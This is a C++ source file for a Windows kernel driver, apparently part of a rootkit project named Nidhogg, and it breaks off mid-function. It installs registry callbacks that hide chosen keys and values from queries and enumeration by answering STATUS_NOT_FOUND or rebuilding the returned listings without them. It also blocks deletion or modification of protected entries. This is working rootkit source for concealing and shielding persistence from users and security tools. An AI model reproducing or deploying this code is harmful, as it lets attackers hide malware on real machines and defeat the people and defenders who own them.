#include "pch.h"
#include "RegistryUtils.hpp"
#include "MemoryAllocator.hpp"

RegistryUtils::RegistryUtils() {
	this->RegCookie = { 0 };

	this->ProtectedItems.Keys.KeysCount = 0;
	this->ProtectedItems.Keys.LastIndex = 0;
	this->ProtectedItems.Values.ValuesCount = 0;
	this->ProtectedItems.Values.LastIndex = 0;

	this->HiddenItems.Keys.KeysCount = 0;
	this->HiddenItems.Keys.LastIndex = 0;
	this->HiddenItems.Values.ValuesCount = 0;
	this->HiddenItems.Values.LastIndex = 0;

	memset(this->HiddenItems.Keys.KeysPath, 0, sizeof(this->HiddenItems.Keys.KeysPath));
	memset(this->HiddenItems.Values.ValuesPath, 0, sizeof(this->HiddenItems.Values.ValuesPath));
	memset(this->HiddenItems.Values.ValuesName, 0, sizeof(this->HiddenItems.Values.ValuesName));


	memset(this->ProtectedItems.Keys.KeysPath, 0, sizeof(this->ProtectedItems.Keys.KeysPath));
	memset(this->ProtectedItems.Values.ValuesPath, 0, sizeof(this->HiddenItems.Values.ValuesPath));
	memset(this->ProtectedItems.Values.ValuesName, 0, sizeof(this->HiddenItems.Values.ValuesName));

	this->Lock.Init();
}

RegistryUtils::~RegistryUtils() {
	AutoLock locker(this->Lock);

	// Protected items.
	for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
		if (this->ProtectedItems.Keys.KeysPath[i]) {
			ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
			this->ProtectedItems.Keys.KeysPath[i] = nullptr;
		}
	}
	this->ProtectedItems.Keys.KeysCount = 0;
	this->ProtectedItems.Keys.LastIndex = 0;

	for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
		if (this->ProtectedItems.Values.ValuesName[i]) {
			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
			this->ProtectedItems.Values.ValuesName[i] = nullptr;
		}
		if (this->ProtectedItems.Values.ValuesPath[i]) {
			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
			this->ProtectedItems.Values.ValuesPath[i] = nullptr;
		}
		
	}
	this->ProtectedItems.Values.ValuesCount = 0;
	this->ProtectedItems.Values.LastIndex = 0;

	// Hidden items.
	for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
		if (this->HiddenItems.Keys.KeysPath[i]) {
			ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
			this->HiddenItems.Keys.KeysPath[i] = nullptr;
		}
	}
	this->HiddenItems.Keys.KeysCount = 0;
	this->HiddenItems.Keys.LastIndex = 0;

	for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
		if (this->HiddenItems.Values.ValuesName[i]) {
			ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
			this->HiddenItems.Values.ValuesName[i] = nullptr;
		}
		if (this->HiddenItems.Values.ValuesPath[i]) {
			ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
			this->HiddenItems.Values.ValuesPath[i] = nullptr;
		}

	}
	this->HiddenItems.Values.ValuesCount = 0;
	this->HiddenItems.Values.LastIndex = 0;
}


/*
* Description:
* OnRegistryNotify is responsible for handling registry operations and handle some of them.
*
* Parameters:
* @context [PVOID]    -- Unused.
* @arg1    [PVOID]    -- Type of operation.
* @arg2    [PVOID]    -- Operation's information.
*
* Returns:
* @status  [NTSTATUS] -- Whether the operation was successful or not.
*/
NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2) {
	UNREFERENCED_PARAMETER(context);
	NTSTATUS status = STATUS_SUCCESS;

	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)arg1) {
	case RegNtPreDeleteKey:
		status = NidhoggRegistryUtils->RegNtPreDeleteKeyHandler(static_cast<REG_DELETE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreDeleteValueKey:
		status = NidhoggRegistryUtils->RegNtPreDeleteValueKeyHandler(static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreQueryKey:
		status = NidhoggRegistryUtils->RegNtPreQueryKeyHandler(static_cast<REG_QUERY_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreQueryValueKey:
		status = NidhoggRegistryUtils->RegNtPreQueryValueKeyHandler(static_cast<REG_QUERY_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreQueryMultipleValueKey:
		status = NidhoggRegistryUtils->RegNtPreQueryMultipleValueKeyHandler(static_cast<REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreSetValueKey:
		status = NidhoggRegistryUtils->RegNtPreSetValueKeyHandler(static_cast<REG_SET_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPostEnumerateKey:
		status = NidhoggRegistryUtils->RegNtPostEnumerateKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
		break;
	case RegNtPostEnumerateValueKey:
		status = NidhoggRegistryUtils->RegNtPostEnumerateValueKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
		break;
	}

	return status;
}

/*
* Description:
* RegNtPreDeleteKeyHandler is responsible for handling registry key deletion and block it for protected registry keys.
*
* Parameters:
* @info   [REG_DELETE_KEY_INFORMATION*] -- Contains important information such as key path, key object, etc.
*
* Returns:
* @status [NTSTATUS]					-- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info) {
	RegItem regItem{};
	PCUNICODE_STRING regPath;
	NTSTATUS status = STATUS_SUCCESS;

	// To avoid BSOD.
	if (!info->Object || !VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
		return STATUS_SUCCESS;

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status)) {
		return STATUS_SUCCESS;
	}

	if (!regPath->Buffer || regPath->Length == 0 || !VALID_KERNELMODE_MEMORY((DWORD64)regPath->Buffer)) {
		return STATUS_SUCCESS;
	}

	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
	regItem.Type = RegProtectedKey;

	if (FindRegItem(&regItem)) {
		auto prevIrql = KeGetCurrentIrql();
		KeLowerIrql(PASSIVE_LEVEL);
		KdPrint((DRIVER_PREFIX "Protected key %ws\n", regItem.KeyPath));
		KeRaiseIrql(prevIrql, &prevIrql);
		status = STATUS_ACCESS_DENIED;
	}

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreDeleteValueKeyHandler is responsible for handling registry value deletion and block it for protected registry values.
*
* Parameters:
* @info   [REG_DELETE_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, value name, key object, etc.
*
* Returns:
* @status [NTSTATUS]						  -- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
	RegItem regItem{};
	PCUNICODE_STRING regPath;
	NTSTATUS status = STATUS_SUCCESS;

	// To avoid BSOD.
	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
		return STATUS_SUCCESS;

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status)) {
		return STATUS_SUCCESS;
	}

	if (!regPath->Buffer || regPath->Length == 0 || !VALID_KERNELMODE_MEMORY((DWORD64)regPath->Buffer)) {
		return STATUS_SUCCESS;
	}

	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
	wcsncpy_s(regItem.ValueName, info->ValueName->Buffer, info->ValueName->Length / sizeof(WCHAR));
	regItem.Type = RegProtectedValue;

	if (FindRegItem(&regItem)) {
		auto prevIrql = KeGetCurrentIrql();
		KeLowerIrql(PASSIVE_LEVEL);
		KdPrint((DRIVER_PREFIX "Protected value %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
		KeRaiseIrql(prevIrql, &prevIrql);
		status = STATUS_ACCESS_DENIED;
	}

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreQueryKeyHandler is responsible for handling registry key query and block it for hidden registry keys.
*
* Parameters:
* @info   [REG_QUERY_KEY_INFORMATION*] -- Contains important information such as key path, key object, etc.
*
* Returns:
* @status [NTSTATUS]				   -- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info) {
	RegItem regItem{};
	PCUNICODE_STRING regPath;
	NTSTATUS status = STATUS_SUCCESS;

	// To avoid BSOD.
	if (!info->Object || !VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
		return STATUS_SUCCESS;

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status)) {
		return STATUS_SUCCESS;
	}

	if (!regPath->Buffer || regPath->Length == 0 || !VALID_KERNELMODE_MEMORY((DWORD64)regPath->Buffer)) {
		return STATUS_SUCCESS;
	}

	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
	regItem.Type = RegHiddenKey;

	if (FindRegItem(&regItem)) {
		auto prevIrql = KeGetCurrentIrql();
		KeLowerIrql(PASSIVE_LEVEL);
		KdPrint((DRIVER_PREFIX "Hid key from query %ws\n", regItem.KeyPath));
		KeRaiseIrql(prevIrql, &prevIrql);
		status = STATUS_NOT_FOUND;
	}

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreQueryValueKeyHandler is responsible for handling registry value query and block it for hidden registry values.
*
* Parameters:
* @info   [REG_QUERY_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, value name, key object, etc.
*
* Returns:
* @status [NTSTATUS]						 -- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info) {
	RegItem regItem{};
	PCUNICODE_STRING regPath;
	NTSTATUS status = STATUS_SUCCESS;

	// To avoid BSOD.
	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
		return STATUS_SUCCESS;

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status)) {
		return STATUS_SUCCESS;
	}

	if (!regPath->Buffer || regPath->Length == 0 || !VALID_KERNELMODE_MEMORY((DWORD64)regPath->Buffer)) {
		return STATUS_SUCCESS;
	}

	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
	wcsncpy_s(regItem.ValueName, info->ValueName->Buffer, info->ValueName->Length / sizeof(WCHAR));
	regItem.Type = RegHiddenValue;

	if (FindRegItem(&regItem)) {
		auto prevIrql = KeGetCurrentIrql();
		KeLowerIrql(PASSIVE_LEVEL);
		KdPrint((DRIVER_PREFIX "Hid value from query %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
		KeRaiseIrql(prevIrql, &prevIrql);
		status = STATUS_NOT_FOUND;
	}

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreQueryMultipleValueKeyHandler is responsible for handling registry multiple value query and block it for hidden registry values.
*
* Parameters:
* @info   [REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, values list, key object, etc.
*
* Returns:
* @status [NTSTATUS]								  -- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info) {
	RegItem regItem{};
	PCUNICODE_STRING regPath;
	NTSTATUS status = STATUS_SUCCESS;

	// To avoid BSOD.
	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
		return STATUS_SUCCESS;

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status)) {
		return STATUS_SUCCESS;
	}

	if (!regPath->Buffer || regPath->Length == 0 || !VALID_KERNELMODE_MEMORY((DWORD64)regPath->Buffer)) {
		return STATUS_SUCCESS;
	}

	regItem.Type = RegHiddenValue;
	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));

	for (ULONG index = 0; index < info->EntryCount; index++) {
		wcsncpy_s(regItem.ValueName, info->ValueEntries[index].ValueName->Buffer, info->ValueEntries[index].ValueName->Length / sizeof(WCHAR));

		if (FindRegItem(&regItem)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Hid value from multiple query %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
			KeRaiseIrql(prevIrql, &prevIrql);
			status = STATUS_NOT_FOUND;
			break;
		}

		regItem.ValueName[0] = L'\0';
	}

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreSetValueKeyHandler is responsible for handling registry value modify operation and block it for protected registry values.
*
* Parameters:
* @info   [REG_SET_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, value name, key object, etc.
*
* Returns:
* @status [NTSTATUS]					   -- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
	RegItem regItem{};
	PCUNICODE_STRING regPath;
	NTSTATUS status = STATUS_SUCCESS;

	// To avoid BSOD.
	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
		return STATUS_SUCCESS;

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status)) {
		return STATUS_SUCCESS;
	}

	if (!regPath->Buffer || regPath->Length == 0 || !VALID_KERNELMODE_MEMORY((DWORD64)regPath->Buffer)) {
		return STATUS_SUCCESS;
	}

	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
	wcsncpy_s(regItem.ValueName, info->ValueName->Buffer, info->ValueName->Length / sizeof(WCHAR));
	regItem.Type = RegProtectedValue;

	if (FindRegItem(&regItem)) {
		auto prevIrql = KeGetCurrentIrql();
		KeLowerIrql(PASSIVE_LEVEL);
		KdPrint((DRIVER_PREFIX "Blocked setting value %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
		KeRaiseIrql(prevIrql, &prevIrql);
		status = STATUS_ACCESS_DENIED;
	}

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPostEnumerateKeyHandler is responsible for handling registry key enumeration and hide the protected registry keys.
*
* Parameters:
* @info   [REG_POST_OPERATION_INFORMATION*] -- Contains important information such as keys list, keys objects, etc.
*
* Returns:
* @status [NTSTATUS]					    -- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
	HANDLE key;
	PVOID tempKeyInformation = NULL;
	REG_ENUMERATE_KEY_INFORMATION* preInfo;
	PCUNICODE_STRING regPath;
	ULONG resultLength = 0;
	RegItem item{};
	UNICODE_STRING keyName;
	int counter = 0;
	NTSTATUS status = STATUS_SUCCESS;
	bool copyKeyInformationitem = true;

	if (!NT_SUCCESS(info->Status)) {
		return status;
	}

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status))
		return status;

	// Checking if the registry key contains any protected registry key.
	if (!ContainsProtectedRegKey(*regPath, RegHiddenKey)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	RtlInitUnicodeString(&keyName, L"");

	preInfo = (REG_ENUMERATE_KEY_INFORMATION*)info->PreInformation;

	if (!GetNameFromKeyEnumPreInfo(preInfo->KeyInformationClass, preInfo->KeyInformation, &keyName)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	keyName.Buffer[keyName.MaximumLength / sizeof(WCHAR)] = L'\0';

	// Rebuilding the KeyInformation without the hidden keys.
	status = ObOpenObjectByPointerWithTag(info->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, KernelMode, DRIVER_TAG, &key);

	if (!NT_SUCCESS(status)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}

	MemoryAllocator<PVOID> tempKeyInfoAlloc(tempKeyInformation, preInfo->Length, PagedPool);

	if (tempKeyInformation) {
		item.Type = RegHiddenKey;
		wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));

		// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
		while (copyKeyInformationitem) {
			status = ZwEnumerateKey(key, preInfo->Index + counter, preInfo->KeyInformationClass, tempKeyInformation, preInfo->Length, &resultLength);

			if (!NT_SUCCESS(status)) {
				copyKeyInformationitem = false;
				continue;
			}

			if (!GetNameFromKeyEnumPreInfo(preInfo->KeyInformationClass, tempKeyInformation, &keyName)) {
				copyKeyInformationitem = false;
				continue;
			}
			keyName.Buffer[keyName.MaximumLength / sizeof(WCHAR)] = L'\0';

			// Concatenating the key path and name to check against FindRegItem.
			wcscat_s(item.KeyPath, L"\\");
			wcscat_s(item.KeyPath, keyName.Buffer);

			if (!FindRegItem(&item)) {
				*preInfo->ResultLength = resultLength;

				__try {
					RtlCopyMemory(preInfo->KeyInformation, tempKeyInformation, resultLength);
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {
					KdPrint((DRIVER_PREFIX "Failed to copy the next key item, 0x%x\n", GetExceptionCode()));
				}

				copyKeyInformationitem = false;
			}
			else {
				counter++;
				auto prevIrql = KeGetCurrentIrql();
				KeLowerIrql(PASSIVE_LEVEL);
				KdPrint((DRIVER_PREFIX "Hid registry key %ws\n", item.KeyPath));
				KeRaiseIrql(prevIrql, &prevIrql);
			}

			// To avoid concatenating bad item.
			item.KeyPath[0] = L'\0';
			wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
		}
	}
	else
		status = STATUS_SUCCESS;

	info->ReturnStatus = status;
	ZwClose(key);
	CmCallbackReleaseKeyObjectIDEx(regPath);

	return STATUS_SUCCESS;
}

/*
* Description:
* RegNtPostEnumerateValueKeyHandler is responsible for handling registry value enumeration and hide the protected registry values.
*
* Parameters:
* @info   [REG_POST_OPERATION_INFORMATION*] -- Contains important information such as keys list, keys objects, etc.
*
* Returns:
* @status [NTSTATUS]					    -- Whether the operation was successful or not.
*/
NTSTATUS RegistryUtils::RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
	HANDLE key;
	PVOID tempValueInformation = NULL;
	REG_ENUMERATE_VALUE_KEY_INFORMATION* preInfo;
	PCUNICODE_STRING regPath;
	UNICODE_STRING valueName;
	ULONG resultLength = 0;
	RegItem item{};
	NTSTATUS status = STATUS_SUCCESS;
	bool copyKeyInformationitem = true;
	int counter = 0;

	if (!NT_SUCCESS(info->Status)) {
		return STATUS_SUCCESS;
	}

	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);

	if (!NT_SUCCESS(status))
		return STATUS_SUCCESS;

	// Checking if the registry key contains any protected registry value.
	if (!ContainsProtectedRegKey(*regPath, RegHiddenValue)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}

	preInfo = (REG_ENUMERATE_VALUE_KEY_INFORMATION*)info->PreInformation;

	if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	valueName.Buffer[valueName.Length / sizeof(WCHAR)] = L'\0';

	// Rebuilding the KeyInformation without the hidden keys.
	status = ObOpenObjectByPointerWithTag(info->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, KernelMode, DRIVER_TAG, &key);

	if (!NT_SUCCESS(status)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	MemoryAllocator<PVOID> tempValueInfoAlloc(tempValueInformation, preInfo->Length, PagedPool);

	if (tempValueInformation) {
		item.Type = RegHiddenValue;
		wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));

		// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
		while (copyKeyInformationitem) {
			status = ZwEnumerateValueKey(key, preInfo->Index + counter, preInfo->KeyValueInformationClass, tempValueInformation, preInfo->Length, &resultLength);

			if (!NT_SUCCESS(status)) {
				copyKeyInformationitem = false;
				continue;
			}

			if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
				copyKeyInformationitem = false;
			}
			valueName.Buffer[valueName.Length / sizeof(WCHAR)] = L'\0';
			item.ValueName[0] = L'\0';
			wcsncpy_s(item.ValueName, valueName.Buffer, valueName.Length / sizeof(WCHAR));

			if (!FindRegItem(&item)) {
				*preInfo->ResultLength = resultLength;

				// Adding the try & except to be sure, copying memory shouldn't cause a problem.
				__try {
					RtlCopyMemory(preInfo->KeyValueInformation, tempValueInformation, resultLength);
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {
					KdPrint((DRIVER_PREFIX "Failed to copy the next value item, 0x%x\n", GetExceptionCode()));
				}

				copyKeyInformationitem = false;
				continue;
			}
			else {
				counter++;
				auto prevIrql = KeGetCurrentIrql();
				KeLowerIrql(PASSIVE_LEVEL);
				KdPrint((DRIVER_PREFIX "Hid registry value %ws\n", item.KeyPath));
				KeRaiseIrql(prevIrql, &prevIrql);
			}
		}
	}
	else
		status = STATUS_SUCCESS;

	info->ReturnStatus = status;
	ZwClose(key);
	CmCallbackReleaseKeyObjectIDEx(regPath);

	return STATUS_SUCCESS;
}

/*
* Description:
* GetNameFromValueEnumPreInfo is responsible for getting the value name from the key value information.
*
* Parameters:
* @infoClass   [KEY_VALUE_INFORMATION_CLASS] -- Contains the type of key value infromation.
* @information [PVOID]					     -- Contains the information itself.
* @valueName   [PUNICODE_STRING]			 -- The value name will be written there.
*
* Returns:
* @status	   [bool]						 -- Whether the operation was successful or not.
*/
bool RegistryUtils::GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING valueName) {
	switch (infoClass) {
	case KeyValueBasicInformation:
	{
		KEY_VALUE_BASIC_INFORMATION* valueInfo = (KEY_VALUE_BASIC_INFORMATION*)information;
		valueName->Buffer = valueInfo->Name;
		valueName->Length = (USHORT)valueInfo->NameLength;
		valueName->MaximumLength = (USHORT)valueInfo->NameLength;
		break;
	}
	case KeyValueFullInformation:
	case KeyValueFullInformationAlign64:
	{
		KEY_VALUE_FULL_INFORMATION* valueInfo = (KEY_VALUE_FULL_INFORMATION*)information;
		valueName->Buffer = valueInfo->Name;
		valueName->Length = (USHORT)valueInfo->NameLength;
		valueName->MaximumLength = (USHORT)valueInfo->NameLength;
		break;
	}
	default:
		return false;
	}
	return true;
}

/*
* Description:
* GetNameFromKeyEnumPreInfo is responsible for getting the key name from the key information.
*
* Parameters:
* @infoClass   [KEY_VALUE_INFORMATION_CLASS] -- Contains the type of the key infromation.
* @information [PVOID]					     -- Contains the information itself.
* @keyName     [PUNICODE_STRING]			 -- The key name will be written there.
*
* Returns:
* @status	   [bool]						 -- Whether the operation was successful or not.
*/
bool RegistryUtils::GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName) {
	switch (infoClass) {
	case KeyBasicInformation:
	{
		KEY_BASIC_INFORMATION* basicInfo = (KEY_BASIC_INFORMATION*)information;
		keyName->Buffer = basicInfo->Name;
		keyName->Length = (USHORT)basicInfo->NameLength;
		keyName->MaximumLength = (USHORT)basicInfo->NameLength;
		break;
	}
	case KeyNameInformation:
	{
		KEY_NAME_INFORMATION* nameInfo = (KEY_NAME_INFORMATION*)information;
		keyName->Buffer = nameInfo->Name;
		keyName->Length = (USHORT)nameInfo->NameLength;
		keyName->MaximumLength = (USHORT)nameInfo->NameLength;
		break;
	}
	case KeyNodeInformation:
	{
		KEY_NODE_INFORMATION* nodeInfo = (KEY_NODE_INFORMATION*)information;
		keyName->Buffer = nodeInfo->Name;
		keyName->Length = (USHORT)nodeInfo->NameLength;
		keyName->MaximumLength = (USHORT)nodeInfo->NameLength;
		break;
	}
	default:
		return false;
	}

	return true;
}

/*
* Description:
* FindRegItem is responsible for searching if a registry item exists in any of the registry items lists.
*
* Parameters:
* @item	  [RegItem*] -- Registry item to search.
*
* Returns:
* @status [bool]	 -- Whether found or not.
*/
bool RegistryUtils::FindRegItem(RegItem* item) {
	bool found = false;
	AutoLock locker(this->Lock);

	switch (item->Type) {
		case RegProtectedKey:
		{
			for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
				if (this->ProtectedItems.Keys.KeysPath[i]) {
					if (_wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->ProtectedItems.Keys.KeysPath[i])) == 0) {
						found = true;
						break;
					}
				}
			}
			break;
		}
		case RegHiddenKey:
		{
			for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
				if (this->HiddenItems.Keys.KeysPath[i]) {
					if (_wcsnicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->HiddenItems.Keys.KeysPath[i])) == 0) {
						found = true;
						break;
					}
				}
			}
			break;
		}
		case RegProtectedValue:
		{
			for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
				if (this->ProtectedItems.Values.ValuesPath[i] && this->ProtectedItems.Values.ValuesName[i]) {
					if (_wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->ProtectedItems.Values.ValuesPath[i])) == 0 &&
						_wcsnicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName, wcslen(this->ProtectedItems.Values.ValuesName[i])) == 0) {
						found = true;
						break;
					}
				}
			}
			break;
		}
		case RegHiddenValue:
		{
			for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
				if (this->HiddenItems.Values.ValuesPath[i] && this->HiddenItems.Values.ValuesName[i]) {
					if (_wcsnicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->HiddenItems.Values.ValuesPath[i])) == 0 &&
						_wcsnicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName, wcslen(this->HiddenItems.Values.ValuesName[i])) == 0) {
						found = true;
						break;
					}
				}
			}
			break;
		}
	}

	return found;
}

/*
* Description:
* ContainsProtectedRegKey is responsible for searching if a registry item is contained inside any registry items lists.
*
* Parameters:
* @regKey [UNICODE_STRING] -- Registry item to search.
* @type	  [RegItemType]	   -- Type of the registry item.
*
* Returns:
* @status [bool]		   -- Whether found or not.
*/
bool RegistryUtils::ContainsProtectedRegKey(UNICODE_STRING regKey, RegItemType type) {
	bool found = false;
	AutoLock locker(this->Lock);

	switch (type) {
	case RegProtectedKey:
	{
		for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
			if (this->ProtectedItems.Keys.KeysPath[i]) {
				if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Keys.KeysPath[i]) && _wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
					found = true;
					break;
				}
			}
		}
		break;
	}
	case RegHiddenKey:
	{
		for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
			if (this->HiddenItems.Keys.KeysPath[i]) {
				if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Keys.KeysPath[i]) && _wcsnicmp(this->HiddenItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
					found = true;
					break;
				}
			}
		}
		break;
	}
	case RegProtectedValue:
	{
		for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
			if (this->ProtectedItems.Values.ValuesPath[i]) {
				if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Values.ValuesPath[i]) && _wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
					found = true;
					break;
				}
			}
		}
		break;
	}
	case RegHiddenValue:
	{
		for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
			if (this->HiddenItems.Values.ValuesPath[i]) {
				if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Values.ValuesPath[i]) && _wcsnicmp(this->HiddenItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
					found = true;
					break;
				}
			}
		}
		break;
	}
	}

	return found;
}

/*
* Description:
* AddRegItem is responsible for adding a registry item to the list of protected registry items.
*
* Parameters:
* @item	  [RegItem*] -- Registry item to add.
*
* Returns:
* @status [bool]	 -- Whether successfully added or not.
*/
bool RegistryUtils::AddRegItem(RegItem* item) {
	bool added = false;
	AutoLock locker(this->Lock);

	switch (item->Type) {
	case RegProtectedKey:
	{
		for (ULONG i = 0; i < MAX_REG_ITEMS; i++)
			if (this->ProtectedItems.Keys.KeysPath[i] == nullptr) {
				SIZE_T len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
